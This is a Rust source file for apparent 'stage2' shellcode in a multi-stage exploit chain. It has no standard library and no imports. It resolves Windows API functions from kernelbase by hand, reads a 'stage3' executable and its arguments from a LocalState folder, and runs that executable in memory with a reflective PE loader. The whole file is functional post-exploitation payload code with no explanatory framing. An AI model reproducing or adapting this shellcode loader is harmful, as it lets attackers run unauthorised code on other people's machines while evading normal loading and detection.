#![feature(allocator_api)]
#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(overflowing_literals)]
#![no_std]
#![no_main]

extern crate alloc;

use core::arch::asm;
use core::ffi::c_void;
use core::mem::MaybeUninit;
use core::panic::PanicInfo;

use alloc::vec::Vec;
use embedded_io::{ErrorType, Write};
use shellcode_utils::prelude::*;
use solstice_loader::{DependentModules, LoaderContext, RuntimeFns};

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

const STAGE3_ENV_PAYLOAD_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\run.exe"#, "\0");
const STAGE3_ENV_ARGS_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\args.txt"#, "\0");

const STAGE2_ERROR_FILE_OPEN_FAILED: u64 = 0x200000000_00000001;
const STAGE2_ERROR_FILE_READ_FAILED: u64 = 0x200000000_00000002;
const STAGE2_ERROR_INVALID_UTF8: u64 = 0x200000000_00000003;

#[no_mangle]
pub extern "C" fn main() -> u64 {
    // unsafe {
    //     asm!("int 3");
    // }
    unsafe { asm!("and rsp, ~0xf") };

    // unsafe {
    //     // clean argc and argv
    //     asm!("mov rcx, 0", "mov rdx, 0",);
    // }

    let kernelbase_ptr = get_kernelbase().unwrap();
    let kernel32_ptr = get_kernel32(kernelbase_ptr).unwrap();

    #[cfg(feature = "debug")]
    let OutputDebugStringA = fetch_output_debug_string(kernelbase_ptr);
    macro_rules! debug_print {
        ($msg:expr) => {
            #[cfg(feature = "debug")]
            unsafe {
                OutputDebugStringA(concat!($msg, "\n\0").as_ptr() as _)
            }
        };
    }

    macro_rules! debug_print2 {
        ($msg:expr) => {
            #[cfg(feature = "debug")]
            unsafe {
                OutputDebugStringA($msg.as_ptr() as _)
            }
        };
    }

    debug_print!("Hello from stage2");

    let VirtualAlloc = fetch_virtual_alloc(kernelbase_ptr);
    let VirtualFree = fetch_virtual_free(kernelbase_ptr);
    let VirtualProtect = fetch_virtual_protect(kernelbase_ptr);
    let GetProcAddress = fetch_get_proc_address(kernelbase_ptr);
    let LoadLibraryA = fetch_load_library(kernelbase_ptr);
    let CreateThread = fetch_create_thread(kernelbase_ptr);
    let RtlAddFunctionTable = fetch_rtl_add_fn_table(kernel32_ptr);
    let GlobalAlloc = fetch_global_alloc(kernelbase_ptr);
    let GlobalFree = fetch_global_free(kernelbase_ptr);
    let GetFullPathNameA = fetch_get_full_path_name(kernelbase_ptr);

    // let allocator = WinGlobalAlloc::new(kernel32_ptr);
    // let mut v = alloc::vec::Vec::with_capacity_in(100, allocator);
    // v.extend_from_slice(b"hello from dynamically allocated string!\n\0");

    // use embedded_io::*;

    // debug_break!();
    // let res = write!(
    //     v.as_mut_slice(),
    //     "hello from formatted string! \n\0",
    //     //VirtualAlloc
    // );
    // debug_print2!(v);

    let GetModuleHandleA = fetch_get_module_handle(kernelbase_ptr);
    let ExpandEnvironmentStringsA = fetch_expand_environment_strings(kernelbase_ptr);

    macro_rules! heap_alloc {
        ($size:expr) => {
            unsafe { (GlobalAlloc)(0x40, $size) }
        };
    }

    let mut stage3_filename: MaybeUninit<[u8; 200]> = MaybeUninit::uninit();
    unsafe {
        (ExpandEnvironmentStringsA)(
            STAGE3_ENV_PAYLOAD_FILENAME.as_ptr(),
            stage3_filename.as_mut_ptr() as *mut _,
            core::mem::size_of_val(&stage3_filename) as u32,
        );
    }

    // Get the full image name without the ..\ and all other
    // unnecessary path characters.
    let image_name = unsafe {
        // Get the size of the buffer needed
        let image_name_length = (GetFullPathNameA)(
            stage3_filename.as_ptr() as *const _,
            0,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        );

        // Allocate some memory for the image
        let image_full_name = heap_alloc!(image_name_length as usize) as *mut u8;

        // Get the full path name
        let image_full_name_len = (GetFullPathNameA)(
            stage3_filename.as_ptr() as *const _,
            image_name_length,
            image_full_name,
            core::ptr::null_mut(),
        ) as usize;

        core::slice::from_raw_parts(image_full_name, image_full_name_len)
    };

    let file_funcs = FileReaderFuncs {
        create_file: fetch_create_file(kernelbase_ptr),
        read_file: fetch_read_file(kernelbase_ptr),
        get_size: fetch_get_file_size(kernelbase_ptr),
        virtual_alloc: VirtualAlloc,
        close_handle: fetch_close_handle(kernelbase_ptr),
    };

    // Map the returned errors to hard constants since the constants have the upper bit set
    // to signal which stage failed
    let stage3_reader = FileReader::open(stage3_filename.as_ptr() as *const _, &file_funcs);
    if stage3_reader.is_err() {
        return STAGE2_ERROR_FILE_OPEN_FAILED;
    }
    let mut stage3_reader = unsafe { stage3_reader.unwrap_unchecked() };

    // Read the full stage3 PE file to memory
    let pe_data = match stage3_reader.read_all() {
        Ok((stage3_data, stage3_size)) => unsafe {
            core::slice::from_raw_parts(stage3_data as *const u8, stage3_size as usize)
        },
        Err(FileReaderError::ReadFailed) => {
            return STAGE2_ERROR_FILE_READ_FAILED;
        }
        Err(FileReaderError::OpenFailed) => {
            // Should be impossible but we'll handle it anyways for completeness
            unreachable!();
        }
    };

    drop(stage3_reader);

    // Try loading stage 3's arguments. Fails gracefully if the file does not exist.
    let mut stage3_args_filename: MaybeUninit<[u8; 200]> = MaybeUninit::uninit();
    unsafe {
        (ExpandEnvironmentStringsA)(
            STAGE3_ENV_ARGS_FILENAME.as_ptr(),
            stage3_args_filename.as_mut_ptr() as *mut _,
            core::mem::size_of_val(&stage3_args_filename) as u32,
        );
    }

    let stage3_args = FileReader::open(stage3_args_filename.as_ptr() as *const _, &file_funcs)
        .ok()
        .and_then(|mut args_reader| {
            // Read the arguments to a buffer, create a new pointer array to hold all the args, then copy args over.
            let raw_args = match args_reader.read_all() {
                Ok((args_data, args_size)) => unsafe {
                    core::slice::from_raw_parts(args_data as *const u8, args_size)
                },
                Err(FileReaderError::ReadFailed) => {
                    return None;
                }
                Err(FileReaderError::OpenFailed) => {
                    // Should be impossible but we'll handle it anyways for completeness
                    unreachable!();
                }
            };

            unsafe {
                let args_len = raw_args.len();
                // 3 extra characters for the quotes surrounding the image name, and space separating image name and args.
                // A null terminator character isn't necessary since it is already accounted for by `image_name.len()`
                let args_full_len = args_len + image_name.len() + 3;
                let args_with_image_name = heap_alloc!(args_full_len) as *mut u8;

                let mut offset = 0;
                args_with_image_name.write(b'"');
                offset += 1;

                core::ptr::copy_nonoverlapping(
                    image_name.as_ptr(),
                    args_with_image_name.offset(offset),
                    image_name.len(),
                );
                offset += image_name.len() as isize;

                args_with_image_name.offset(offset).write(b'"');
                offset += 1;

                args_with_image_name.offset(offset).write(b' ');
                offset += 1;

                core::ptr::copy_nonoverlapping(
                    raw_args.as_ptr(),
                    args_with_image_name.offset(offset),
                    raw_args.len(),
                );

                let args_slice = core::slice::from_raw_parts(args_with_image_name, args_full_len);
                let utf8_args = match core::str::from_utf8(args_slice) {
                    Ok(s) => s,
                    Err(_) => return None,
                };

                (GlobalFree)(args_with_image_name as *mut _);
                (VirtualFree)(raw_args.as_ptr() as *mut _, 0, 0x00008000);

                let args = solstice_loader::utf8_to_utf16(utf8_args, VirtualAlloc);

                Some(args)
            }
        });

    let image_name_utf16 = match core::str::from_utf8(image_name) {
        Ok(name) => unsafe { solstice_loader::utf8_to_utf16(name, VirtualAlloc) },
        Err(_) => return STAGE2_ERROR_INVALID_UTF8,
    };

    debug_print!("Attempting to load PE");
    let context = LoaderContext {
        buffer: pe_data,
        image_name: Some(image_name_utf16),
        args: stage3_args.as_deref(),
        modules: DependentModules {
            kernelbase: kernelbase_ptr as *mut _,
        },
        fns: RuntimeFns {
            virtual_alloc: VirtualAlloc,
            virtual_protect: VirtualProtect,
            get_proc_address_fn: GetProcAddress,
            load_library_fn: LoadLibraryA,
            // TODO
            create_thread_fn: CreateThread,
            get_module_handle_fn: GetModuleHandleA,
            rtl_add_function_table_fn: Some(RtlAddFunctionTable),
        },
    };
    unsafe {
        solstice_loader::reflective_loader(context);
    }

    0x1337
}

// #[allow(unused_attributes)]
// #[cfg(target_env = "msvc")]
// #[link_args = "/GS- /MERGE:.rdata=.text /MERGE:.pdata=.text /NODEFAULTLIB /EMITPOGOPHASEINFO /DEBUG:NONE"]
// extern "C" {}
